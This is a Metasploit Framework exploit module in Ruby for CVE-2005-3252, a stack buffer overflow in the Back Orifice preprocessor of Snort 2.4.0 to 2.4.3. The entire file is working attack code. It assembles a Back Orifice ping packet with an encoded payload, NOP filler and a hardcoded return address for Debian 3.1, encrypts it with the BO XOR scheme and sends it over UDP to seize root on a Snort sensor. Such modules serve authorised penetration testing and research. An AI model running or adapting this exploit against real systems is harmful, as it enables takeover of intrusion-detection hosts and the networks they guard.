##
# $Id: snortbopre.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Snort Back Orifice Pre-Preprocessor Remote Exploit',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Back Orifice pre-processor module
				included with Snort versions 2.4.0, 2.4.1, 2.4.2, and 2.4.3. This vulnerability could
				be used to completely compromise a Snort sensor, and would typically gain an attacker
				full root or administrative privileges.
			},
			'Author'         => 'KaiJern Lau <xwings [at] mysec.org>',
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					['CVE', '2005-3252'],
					['OSVDB', '20034'],
					['BID', '15131'],
					['URL','http://xforce.iss.net/xforce/alerts/id/207'] ,
				],
			'Payload'        =>
				{
					'Space'    => 1073, #ret : 1069
					'BadChars' => "\x00",
				},
			'Targets'        =>
				[
					# Target 0: Debian 3.1 Sarge
					[
						'Debian 3.1 Sarge',
						{
							'Platform' => 'linux',
							'Ret'      => 0xbffff350
						}
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Oct 18 2005'))

		# Configure the default port to be 9080
		register_options(
			[
				Opt::RPORT(9080),
			], self.class)
	end

	def msrand(seed)
		@holdrand = 31337
		end

	def mrand()
		return (((@holdrand=@holdrand*(214013 & 0xffffffff)+(2531011 & 0xffffffff))>>16)&0x7fff)
		end

	def bocrypt(takepayload)

		@arrpayload = (takepayload.split(//))

		encpayload = ""
		@holdrand=0
		msrand(0)

		@arrpayload.each do |c|
			encpayload +=((c.unpack("C*").map{ |v| (v^(mrand()%256)) }.join)).to_i.chr
		end

		return encpayload
		end


	def exploit
		connect_udp

		boheader =
			"*!*QWTY?"  +
			[1096].pack("V")  +           # Length ,thanx Russell Sanford
			"\xed\xac\xef\x0d"+           # ID
			"\x01"                        # PING

		filler =
			make_nops(1069 -(boheader.length + payload.encode.length))

		udp_sock.write(
			bocrypt(boheader+payload.encode+filler+[target.ret].pack('V'))
		)

		handler
		disconnect_udp
	end

end